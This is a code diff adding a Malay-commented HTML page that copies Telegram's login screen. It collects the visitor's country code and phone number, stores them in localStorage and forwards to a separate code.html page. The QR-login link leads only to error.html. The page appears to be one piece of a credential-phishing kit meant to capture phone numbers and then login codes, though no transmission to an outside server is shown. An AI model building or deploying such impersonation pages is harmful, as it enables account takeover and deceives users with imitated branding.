@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram</title>
+  <link rel="icon" type="image/png" href="test2.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="wrapper">
+    <div class="content">
+      <img src="test.png" alt="Telegram Logo" class="telegram-logo">
+      <h1 class="title">Telegram</h1>
+      <p class="subtitle">
+        Please confirm your country code and enter your<br>
+        phone number.
+      </p>
+
+      <form id="phoneForm" action="code.html" class="form-box">
+        <label for="country" class="label">Country</label>
+        <select id="country" class="input">
+          <option selected>Malaysia (+60)</option>
+          <option>Singapore (+65)</option>
+          <option>Indonesia (+62)</option>
+          <option>Thailand (+66)</option>
+          <option>Philippines (+63)</option>
+          <option>Vietnam (+84)</option>
+          <option>Brunei (+673)</option>
+          <option>Myanmar (+95)</option>
+          <option>Cambodia (+855)</option>
+          <option>China (+86)</option>
+          <option>India (+91)</option>
+          <option>Japan (+81)</option>
+          <option>South Korea (+82)</option>
+          <option>United States (+1)</option>
+          <option>United Kingdom (+44)</option>
+          <option>Australia (+61)</option>
+          <option>New Zealand (+64)</option>
+          <option>Germany (+49)</option>
+          <option>France (+33)</option>
+          <option>Saudi Arabia (+966)</option>
+        </select>
+
+        <label for="phone" class="label">Your phone number</label>
+        <input type="text" id="phone" class="input" placeholder="+60" required>
+
+        <div class="check-line">
+          <input type="checkbox" id="keep" checked>
+          <label for="keep">Keep me signed in</label>
+        </div>
+
+        <button type="submit" id="nextBtn" class="btn" disabled>Next</button>
+      </form>
+
+      <a href="error.html" class="link">LOG IN BY QR CODE</a>
+    </div>
+  </div>
+
+  <!-- 💡 Skrip kawal butang & simpan nombor -->
+  <script>
+    const phoneInput = document.getElementById("phone");
+    const nextBtn = document.getElementById("nextBtn");
+    const form = document.getElementById("phoneForm");
+
+    // Hanya enable bila ada input
+    phoneInput.addEventListener("input", () => {
+      nextBtn.disabled = phoneInput.value.trim() === "";
+    });
+
+    // Simpan nombor sebelum pindah ke code.html
+    form.addEventListener("submit", (e) => {
+      e.preventDefault(); // elak reload default
+      const country = document.getElementById("country").value;
+      const phone = phoneInput.value.trim();
+      if (phone === "") return;
+
+      localStorage.setItem("telegramNumber", `${country} ${phone}`);
+      form.submit(); // terus ke code.html
+    });
+  </script>
+</body>
+</html>
